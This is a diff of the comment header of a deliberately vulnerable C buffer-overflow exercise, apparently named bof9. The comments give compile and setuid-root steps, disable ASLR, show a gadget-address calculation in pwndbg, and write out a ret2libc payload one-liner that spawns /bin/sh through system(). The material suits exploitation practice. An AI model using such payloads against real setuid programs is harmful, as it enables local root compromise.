@@ -6,6 +6,7 @@
 #define BUF_SIZE 8
 
 ////////////////////////////////////////////////////////////
+// ASLR OFF
 // COMPILE $ gcc -fno-stack-protector bof9.c -o bof9
 // SETUID  $ sudo chown root:root bof9
 //         $ sudo chmod 4755 bof9
@@ -38,9 +39,9 @@
 //         pwndbg> p/x 0x0000000000021102 + 0x7ffff7a0d000
 //              $1 = 0x7ffff7a2e102
 // --------------------------------------------------------
-// ###### MAKE payload!!!
+// ###### MAKE payload
 // payload : [dummy byte (24)] + ["pop rdi ; ret" (8)] + ["/bin/sh" (8)] + [system (8)]
-//         $ (python -c "print 'a'*24+'\x02\xe1\xa2\xf7\xff\x7f\x00\x00'+'\x57\x9d\xb9\xf7\xff\x7f\x00\x00'+'\x90\x23\xa5\xf7\xff\x7f\x00\x00'";cat) | ./bof9
+//         $ (python -c "print 'x'*24+'\x02\xe1\xa2\xf7\xff\x7f\x00\x00'+'\x57\x9d\xb9\xf7\xff\x7f\x00\x00'+'\x90\x23\xa5\xf7\xff\x7f\x00\x00'";cat) | ./bof9
 ////////////////////////////////////////////////////////////
 
 void vuln(void) {
